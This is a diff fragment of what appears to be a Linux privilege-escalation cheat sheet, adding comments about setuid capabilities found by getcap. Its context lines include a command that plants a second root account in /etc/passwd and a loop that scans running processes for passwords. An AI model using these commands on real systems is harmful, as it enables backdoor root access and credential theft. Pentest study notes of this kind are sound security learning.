@@ -6,6 +6,8 @@ echo "anotherroot:XXXXXXX:0:0:root:/root:/bin/bash" >> /etc/passwd
 
 # Find capabilities recursively on /:
 /usr/sbin/getcap -r / 2>/dev/null
+# e.g.: /usr/bin/binary = cap_setuid+ep
+# binary have capab setuid Effective and Permited
 
 # Wactch repeat the command to be like real time:
 watch -n 1 "ps -aux | grep pass"
